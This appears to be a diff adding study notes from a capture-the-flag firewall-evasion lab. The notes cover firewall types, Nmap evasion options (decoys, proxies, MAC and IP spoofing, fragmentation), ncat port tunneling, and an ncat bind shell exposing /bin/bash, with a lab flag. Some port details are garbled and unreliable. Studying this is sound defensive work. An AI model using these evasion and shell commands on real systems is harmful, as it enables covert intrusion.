@@ -1,0 +1,93 @@
+Firewall is a software or hardware that monitors the network traffic and compares it against a set of rules before passing or blocking it
+-basic firewall should inspect: Protocol, Source Address and Destination Address
+-Protocols: TCP, UDP, ICMP
+-TCP or UDP: source port number and destination port number
+
+Telnet TCP: 23
+HTTPS TCP: 443
+TCP HTTP Alternate: 8080
+SNMPSSH: 5161
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Types of Firewalls
+1. Hardware Firewall: network traffic goes through ex. Cisco ASA, WatchGuard Firebox, Netgate pfSense Plus appliance
+2. Software Firewall: software that comes bundled with the OS or as an additional service
+
+1. Personal firewall: protect single system
+2. Commercial firewall: protect medium to large networks - higher reliability and processing power
+
+Firewall types: 
+1. Packet-filtering firewall: most basic type - inspect protocol, source and destination IP addresses and ports in TCP and UDP datagrams
+2. Circuit-level Gateway: In addition to packet-filtering can provide TCP three-way handshake 
+3. Stateful Inspect Firewall: keeps track of established TCP sessions block packets outside of established TCP sessions
+4. Proxy Firewall: check contents of a packet paylload instead of packet headers
+5. Next-Generation Firewall: highest firewall protection from OSI Layer 2 to OSI Layer 7
+6. Cloud Firewall: firewall as a service, replace hardware firewall in a cloud environment
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Evasion via Controlling the source MAC/IP/Port
+
+Nmap allows: Decoys, Proxy, Spoofed Mac Address, Spoofed Source IP, Fixed Source Port Number
+
+-Pn: force scan even if no ping reply is received
+-Pn: skip host discovery and testing whether the host is live = spped up scan, limit to 100 most common ports with -F
+nmap -sS -Pn -F [Machine IP]
+caputred using WireShark
+
+-Decoys
+-hide scan with decoys - mix IP address with other decoy IP addresses
+-D option
+nmap -sS -Pn -D RND,RND,ME - F [Machine IP]
+
+-Proxy
+-use an HTTP/SOCKS4 proxy
+'--proxies PROXY_URL' option
+nmap -sS -Pn --proxies [spoofIP] [machineIP]
+
+-Spoofed Mac Address
+-spoof mac address
+'--spoof-mac MAC_ADDRESS'
+-spoofing works if the system is on the same network segment as the target host
+
+
+-Spoofed IP address
+'-S IP_ADDRESS' option
+
+-fixed Source port number
+-set port number: '-g' or '--source-port'
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Evasion via Forcing Fragmentation, MTU, Data Length
+-'--mtu [value]': specifies the number of bytes per IP packet without IP header size included
+-set to multiple of 8
+-max IP packet over ethernet is 1500 bytes
+-IP header bytes: 20 + mtu option: max byte size
+
+-----------------------------------------------------------------------------------------------------
+
+Port Tunneling
+
+if a server is behind firewall but if the firewall does not block specific ports, those ports can be used to tunnel traffic and avoid firewall
+
+-go to address
+http:/[serverIP]:8080
+
+-enter command
+ncat -lvnp 8008 -c "ncat localhost 80"
+THM{1298331956}
+
+-----------------------------------------------------------------
+
+Evasion using non-standard ports
+
+ncat -lvnp 8081 -e /bin/bash
+
+-attackbox
+ncat [MachineIP] [Port]
+
+whoami
+thmredteam
+
